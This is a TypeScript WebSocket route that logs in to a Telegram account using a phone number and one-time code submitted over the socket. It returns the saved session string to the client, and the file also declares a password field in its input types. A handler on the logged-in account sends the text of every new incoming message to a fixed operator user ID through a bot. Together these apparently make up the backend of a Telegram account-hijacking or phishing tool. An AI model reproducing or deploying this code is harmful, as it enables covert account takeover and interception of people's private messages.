import { WebSocket } from "ws";
import { NewMessage } from "telegram/events";

import { format } from "../../lib/format";
import { Telegram } from "../../lib/telegram";
import { bot, createTg } from "../../instance";

type Event =
  | {
      event: "telegram.sendcode";
      data: {
        phoneNumber: string;
        password: string;
      };
    }
  | {
      event: "telegram.verify";
      data: {
        phoneCode: string;
        phoneNumber: string;
      };
    };

export let clients = [] as Telegram[];

const connect = async () => {
  const tg = createTg();
  await tg.client.connect();
  clients.push(tg);

  return Object.assign(tg, {
    disconnect: async () => {
      clients = clients.filter((client) => client !== tg);
      return tg.client.disconnect();
    },
  });
};

export const safeJSON = {
  parse<T>(value: string) {
    try {
      return JSON.parse(value) as T;
    } catch {
      return null;
    }
  },
};

export const loginRoute = async (socket: WebSocket) => {
  const tg = await connect();

  tg.client.addEventHandler((message) => {
    console.log(message.message.senderId);
    const userId = Number(process.env.USER_ID!);
    bot.telegram.sendMessage(
      userId,
      format("*New Message* \n %", message.message.text)
    );
  }, new NewMessage());

  socket.on("message", async (message) => {
    const event = safeJSON.parse<Event>(message.toString());
    if (event)
      switch (event.event) {
        case "telegram.sendcode":
          console.log(event);
          const data = await tg.sendCode(event.data.phoneNumber);
          console.log(data);
          socket.send(JSON.stringify({ event: "client.sendotp", data }));
          break;
        case "telegram.verify":
          await tg.login(event.data.phoneNumber, event.data.phoneCode);
          const session = tg.session.save();
          socket.send(JSON.stringify({ event: "client.loggedin", session }));
          break;
      }
  });

  socket.on("close", tg.disconnect);
};
